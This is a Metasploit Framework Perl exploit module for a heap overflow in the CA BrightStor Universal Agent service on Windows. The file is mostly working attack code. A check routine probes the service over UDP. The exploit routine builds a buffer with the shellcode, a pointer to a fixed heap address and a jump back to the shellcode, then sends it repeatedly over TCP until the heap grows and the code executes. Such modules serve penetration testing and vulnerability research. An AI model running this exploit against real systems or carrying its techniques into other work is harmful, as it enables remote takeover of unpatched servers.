##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cabrightstor_uniagent;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'CA BrightStor Universal Agent Overflow',
	'Version'  => '$Revision: 1.8 $',
	'Authors' => [ 'Thor Doomen <syscall [at] hushmail.com>' ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003', 'winnt' ],
	'Priv'  => 1,
	'AutoOpts'  => { 'EXITFUNC' => 'process' },
	'UserOpts'  => {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 6050],
	  },

	'Payload' => {

		# 250 bytes of space (bytes 0xa5 -> 0xa8 = reversed)
		'Space'     => 164,
		'BadChars'  => "\x00",
		'Keys'      => ['+ws2ord'],
		'Prepend' => "\x81\xc4\x54\xf2\xff\xff",
	  },

	'Description'  => Pex::Text::Freeform(qq{
	This module exploits a convoluted heap overflow in the CA 
	BrightStor Universal Agent service. Triple userland exception
	results in heap growth and execution of dereferenced function pointer
	at a specified address.
}),

	'Refs'    => [ ['URL', 'http://www.idefense.com/application/poi/display?id=232&type=vulnerabilities'],  ],
	'Targets' => [
		['Magic Heap Target #1', 0x01625c44], # far away heap address
	  ],
	'Keys'    => ['brightstor'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = 6050;

	my $s = Msf::Socket::Udp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("\x00\x00\x0d");
	my $res = $s->Recv(-1, 5);
	$s->Close;

	if (! $res) {
		$self->PrintLine("[*] No response received from the server");
		return $self->CheckCode('Safe');
	}

	$res =~ s/\x00+/ /g;
	$res =~ s/\n|\r//g;

	$self->PrintLine("[*] Response: $res");
	return $self->CheckCode('Detected');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	# The server reverses four bytes starting at 0xa5
	# my $patchy = join('', reverse(split('',substr($shellcode, 0xa5, 4))));
	# substr($shellcode, 0xa5, 4, $patchy);

	# Create the request
	my $boom = "X" x 1024;

	# Required field to trigger the fault
	substr($boom, 248, 2, pack('v', 1000));

	# The shellcode, limited to 250 bytes (no nulls)
	substr($boom, 256, length($shellcode), $shellcode);

	# This should point to itself
	substr($boom, 576, 4, pack('V', $target->[1]));

	# This points to the code below
	substr($boom, 580, 4, pack('V', $target->[1]+8 ));

	# We have 95 bytes, use it to hop back to shellcode
	substr($boom, 584, 6, "\x68" . pack('V', $target->[1]-320) . "\xc3");

	# Stick the protocol header in front of our request
	$boom = "\x00\x00\x00\x00\x03\x20\xa8\x02".$boom;

	$self->PrintLine("[*] Sending " .length($boom) . " bytes to remote host.");

	# We keep making new connections and triggering the fault until
	# the heap is grown to encompass our known return address. Once
	# this address has been allocated and filled, each subsequent
	# request will result in our shellcode being executed.

	for (1 .. 200) {
		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
		  );

		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		if ($_ % 10 == 0) {
			$self->PrintLine("[*] Sending request $_ of 200...");
		}

		$s->Send($boom);
		$s->Close;

		# Give the process time to recover from each exception
		select(undef, undef, undef, 0.1);
	}
	return;
}

1;

